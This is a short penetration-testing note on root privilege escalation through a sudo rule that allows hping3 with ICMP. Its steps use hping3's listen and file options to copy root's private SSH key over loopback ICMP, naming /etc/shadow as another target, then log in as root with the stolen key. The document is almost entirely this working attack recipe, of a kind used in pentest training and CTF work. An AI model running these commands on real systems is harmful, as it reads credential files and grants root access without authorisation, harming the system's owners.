# Hping3 Privilege Escalation

Link: https://gtfobins.github.io/gtfobins/hping3/

## Sudo 

    User USER may run the following commands on HOSTNAME:
      (root) /usr/sbin/hping3 --icmp *

### 1) If you have credentials from the user, create a second session via SSH.

    ssh USER@IP

### 2) On your newly created SSH session, run this to listen for ICMP packets

    sudo /usr/sbin/hping3 --icmp 127.0.0.1 --listen signature --safe

### 3) On your first session, run this to dump the root's private SSH key (or any other sensitive file like /etc/shadow for example)

    sudo /usr/sbin/hping3 --icmp 127.0.0.1 -d 100 --sign signature --file /root/.ssh/id_rsa

### 4) SSH as root

    chmod 600 id_rsa
    ssh root@IP -i id_rsa
